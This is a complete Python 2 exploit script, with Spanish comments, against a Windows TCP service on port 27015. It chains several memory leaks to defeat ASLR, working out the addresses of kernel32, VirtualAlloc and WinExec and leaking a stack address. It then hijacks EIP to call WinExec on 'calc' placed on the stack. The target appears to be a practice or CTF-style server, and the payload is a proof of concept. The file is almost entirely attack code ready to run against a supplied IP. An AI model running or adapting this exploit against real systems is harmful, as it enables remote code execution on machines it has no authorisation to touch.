import sys
import socket
import struct

class Exploit():
	def __init__(self):
		self.s = ""
		self.cookie=""
		self.leakK32BaseThreadInitThunk = ""
		self.KernelBase = ""
		self.VirtualAlloc = ""
		self.WinExec = ""

	def exploit(self, serverIp):
		#Realizo conexion al Servidor
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.s.connect((serverIp, 27015))

		#Envio saludo inicial
		self.cookie = self.hello()
		self.leakApis()

		#Checkeo el correcto leakeo de las Apis sino aborto
		if (self.KernelBase == ""):
			self.abort()
		else:
			#Leakeo una direccion de Stack
			stackAddress = self.leakStackAddress()
			#Checkeo que la direccion sea valida sino aborto
			if(self.checkStackLeak(stackAddress)):
				#Con los datos anteriores obtenidos de forma 
				#correcta continuo con el utlimo paso de la explotacion
				self.continueExplotation(stackAddress)
			else:
				self.abort()

	def hello(self):
		hello = "Hola loco " #10 Bytes
		junk  = "A"*502 # 502 bytes + 10 => Primeros 512 Bytes
		req0 = hello + junk

		self.s.send(req0)
		data = self.s.recv(1024)
		print "Data lenght: "+str(len(data))
		print data
		return data[:4] #Los 4 primeros bytes de la primer respuesta del servidor son una cookie necesaria para todos los request siguientes

	def leakApis(self):
		#Intengo obtener un leak de BaseThreadInitThunk en los siguientes 3 request
		inStack = 0x00000630 #Bytes a sumarle a ESP, para leakear
		for i in range(0,3):
			req = self.cookie+struct.pack("<I", 0x00001000)+struct.pack("<I", inStack)+"A"*500
			self.s.send(req)
			data = self.s.recv(1024)
			self.bypassASLR(data[:4]) #Valido el Leak sino aborto para no matar el Server
			inStack += 0x00000004 #Incremento de a 4 Bytes donde lekeare en cada request para aumentar las probabilidades de encontrar un puntero valido

	def leakStackAddress(self):
		req4 = self.cookie+struct.pack("<I", 0x00001000)+struct.pack("<I", 0x000001A4)+"C"*496 #14A lekea una direccion del stack
		self.s.send(req4)
		stackAddressLE = self.s.recv(1024)[:4]
		stackAddress = hex(int(struct.pack('<I', *struct.unpack('>I', stackAddressLE)).encode("hex"), 16))
		print "[#] Leak Stack Address: "+stackAddress
		return stackAddress

	def continueExplotation(self, stackAddress):
		#Calculo en base a la direccion del stack leakeada la direccion donde alojo calc en el stack
		calcAddress = hex(int(stackAddress, 16)+int(0x29C)) 
		print "[#] Aprox Calc Address: "+calcAddress
		print "[#] Sending Payload"

		#El entero 0x210 es un offset que se utiliza para pisar EIP de forma correcta
		req5 = self.cookie+struct.pack("<I", 0x00000200)+struct.pack("<I", 0x00000210)
		self.s.send(req5)
		data = self.s.recv(1024)			

		#Este es el request que inyecta WinExec+RET+"calc"+JUNKs hacia donde posteriormente EIP saltara
		req6 = self.cookie+struct.pack("<I", int(self.WinExec, 16))+"RETT"+struct.pack("<I", int(calcAddress, 16))+"calc"+"\x00"*494 # En este request se produce el control de eip y puedo meter mi ROP Chain
		self.s.send(req6)
		data = self.s.recv(1024)

		#Request Final para triggerear el RET en MAIN
		req7 = self.cookie+struct.pack("<I", 0x00100000)+struct.pack("<I", 0x00000644)+"B"*500 # Este request es para llegar al ret
		self.s.send(req7)

	def checkStackLeak(self, leak):
		#Checkeo que la direccion leakeada sea "probablemente" la que espero
		isValidStackAddress = False
		if(len(leak)==8): 
			isValidStackAddress = True
		return isValidStackAddress	

	def bypassASLR(self, leak):
		#Calculo de ser posible la direccion de las apis que podria utilizar
		#leak contiene el address de kernel32.dll:kernel32_BaseThreadInitThunk en little endian
		self.leakK32BaseThreadInitThunk = hex(int(struct.pack('<I', *struct.unpack('>I', leak)).encode("hex"), 16)) #Esto se utiliza para convertir un little endian en un hexa del tipo 0xXXXXXXXX
		
		if('4170' in self.leakK32BaseThreadInitThunk): #XXXX4170 => BaseThreadInitThunk
			self.KernelBase = hex(int(self.leakK32BaseThreadInitThunk, 16)-0x4170)
			self.VirtualAlloc = hex(int(self.KernelBase, 16)+0x3EC0)
			self.WinExec = hex(int(self.KernelBase, 16)+0xAA1B0)
			print ""
			print "[#] Leak Done: "
			print " .Leaked Address Kernel32:BaseThreadInitThunk: "+self.leakK32BaseThreadInitThunk
			print " .Kernel32 ImageBase: "+self.KernelBase
			print " .VirtualAlloc: "+self.VirtualAlloc
			print " .WinExec: "+self.WinExec

	def abort(self):
		print "Leak Failed, Aborting Exploit for not crash the remote server"


if(len(sys.argv)>1):
	objExploit = Exploit()
	objExploit.exploit(sys.argv[1])
else:
	print "[!] Use: python exploit.py {server_ip}"


